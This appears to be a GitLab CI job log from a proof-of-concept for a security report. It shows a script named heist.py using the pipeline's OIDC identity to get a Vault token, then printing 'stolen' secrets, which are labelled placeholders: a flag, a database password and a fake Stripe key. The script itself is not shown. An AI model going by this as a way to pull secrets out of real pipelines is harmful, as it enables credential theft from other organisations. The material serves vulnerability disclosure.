@@ -1,0 +1,54 @@
+2026-05-18T21:47:51.747642Z 00O [0KRunning with gitlab-runner 18.10.0~pre.705.ge11dde90 (e11dde90)[0;m
+2026-05-18T21:47:51.747661Z 00O [0K  on green-4.saas-linux-small-amd64.runners-manager.gitlab.com/default ntHFEtyXQ, system ID: s_8990de21c550[0;m
+2026-05-18T21:47:51.747668Z 00O [0K  feature flags: FF_USE_GIT_PROACTIVE_AUTH:true[0;m
+2026-05-18T21:47:51.747691Z 00O [0K[36;1mResolving secrets[0;m[0;m
+2026-05-18T21:47:51.747820Z 00O section_start:1779140871:prepare_executor
+2026-05-18T21:47:51.747822Z 00O+[0K[0K[36;1mPreparing the "docker+machine" executor[0;m[0;m
+2026-05-18T21:47:51.899396Z 00O [0KUsing Docker executor with image python:3.12-slim ...[0;m
+2026-05-18T21:47:56.103503Z 00O [0KUsing effective pull policy of [always] for container python:3.12-slim[0;m
+2026-05-18T21:47:56.104011Z 00O [0KPulling docker image python:3.12-slim ...[0;m
+2026-05-18T21:47:59.529511Z 00O [0KUsing docker image sha256:c8e887bbf3b6fec95a5ff97435d611119ac6e55491cd077db9fdc6b7637bdd47 for python:3.12-slim with digest python@sha256:401f6e1a67dad31a1bd78e9ad22d0ee0a3b52154e6bd30e90be696bb6a3d7461 ...[0;m
+2026-05-18T21:47:59.529571Z 00O section_end:1779140879:prepare_executor
+2026-05-18T21:47:59.529572Z 00O+[0Ksection_start:1779140879:prepare_script
+2026-05-18T21:47:59.529657Z 00O+[0K[0K[36;1mPreparing environment[0;m[0;m
+2026-05-18T21:47:59.530523Z 00O [0KUsing effective pull policy of [always] for container sha256:a4b4798f94768075a3d4069a12bba4413fd7338eb252ee1bd2e25a39ec9ae6a1[0;m
+2026-05-18T21:48:00.694451Z 01O Running on runner-nthfetyxq-project-82321481-concurrent-0 via runner-nthfetyxq-s-l-s-amd64-1779140785-dd7e4e4f...
+2026-05-18T21:48:00.854010Z 00O section_end:1779140880:prepare_script
+2026-05-18T21:48:00.854014Z 00O+[0Ksection_start:1779140880:get_sources
+2026-05-18T21:48:00.854602Z 00O+[0K[0K[36;1mGetting source from Git repository[0;m[0;m
+2026-05-18T21:48:01.219948Z 01O [32;1mGitaly correlation ID: bf44817e25ac4ba3a59ab96fb3db9572[0;m
+2026-05-18T21:48:01.225363Z 01O [32;1mFetching changes with git depth set to 20...[0;m
+2026-05-18T21:48:01.228986Z 01O Initialized empty Git repository in /builds/oidc-poc-grp/heist-40839/.git/
+2026-05-18T21:48:01.231083Z 01O [32;1mCreated fresh repository.[0;m
+2026-05-18T21:48:01.958094Z 01O [32;1mChecking out 10191c33 as detached HEAD (ref is main)...[0;m
+2026-05-18T21:48:01.995481Z 01O 
+2026-05-18T21:48:01.995515Z 01O [32;1mSkipping Git submodules setup[0;m
+2026-05-18T21:48:01.995516Z 01O [32;1m$ git remote set-url origin "${CI_REPOSITORY_URL}" || echo 'Not a git repository; skipping'[0;m
+2026-05-18T21:48:02.153602Z 00O section_end:1779140882:get_sources
+2026-05-18T21:48:02.153607Z 00O+[0Ksection_start:1779140882:step_script
+2026-05-18T21:48:02.154704Z 00O+[0K[0K[36;1mExecuting "step_script" stage of the job script[0;m[0;m
+2026-05-18T21:48:02.154721Z 00O [0KUsing effective pull policy of [always] for container python:3.12-slim[0;m
+2026-05-18T21:48:02.155760Z 00O [0KUsing docker image sha256:c8e887bbf3b6fec95a5ff97435d611119ac6e55491cd077db9fdc6b7637bdd47 for python:3.12-slim with digest python@sha256:401f6e1a67dad31a1bd78e9ad22d0ee0a3b52154e6bd30e90be696bb6a3d7461 ...[0;m
+2026-05-18T21:48:02.519135Z 01O [32;1m$ pip install -q requests[0;m
+2026-05-18T21:48:04.735844Z 01E WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+2026-05-18T21:48:04.842588Z 01E 
+2026-05-18T21:48:04.842593Z 01E [notice] A new release of pip is available: 25.0.1 -> 26.1.1
+2026-05-18T21:48:04.842595Z 01E [notice] To update, run: pip install --upgrade pip
+2026-05-18T21:48:04.915432Z 01O [32;1m$ cat > /tmp/heist.py << 'EOF' # collapsed multi-line command[0;m
+2026-05-18T21:48:04.916641Z 01O [32;1m$ python3 /tmp/heist.py[0;m
+2026-05-18T21:48:06.753364Z 01O user_login=anastasia061694-creator
+2026-05-18T21:48:06.753368Z 01O user_id=38345911
+2026-05-18T21:48:06.753369Z 01O sub=project_path:oidc-poc-grp/heist-40839:ref_type:branch:ref:main
+2026-05-18T21:48:06.753370Z 01O 
+2026-05-18T21:48:06.753370Z 01O VAULT_TOKEN=1666 chars
+2026-05-18T21:48:06.753371Z 01O 
+2026-05-18T21:48:06.753371Z 01O === STOLEN SECRETS ===
+2026-05-18T21:48:06.753372Z 01O   FLAG = AZURE-OIDC-SQUAT-STOLEN-BY-ANASTASIA
+2026-05-18T21:48:06.753373Z 01O   prod-database-password = P@ssw0rd-MSRC-PoC-2026
+2026-05-18T21:48:06.753373Z 01O   stripe-api-key = sk_live_FAKE_msrc_poc_key_12345
+2026-05-18T21:48:06.950586Z 00O section_end:1779140886:step_script
+2026-05-18T21:48:06.950591Z 00O+[0Ksection_start:1779140886:cleanup_file_variables
+2026-05-18T21:48:06.951495Z 00O+[0K[0K[36;1mCleaning up project directory and file based variables[0;m[0;m
+2026-05-18T21:48:07.462211Z 00O section_end:1779140887:cleanup_file_variables
+2026-05-18T21:48:07.462215Z 00O+[0K
+2026-05-18T21:48:07.501100Z 00O [32;1mJob succeeded[0;m
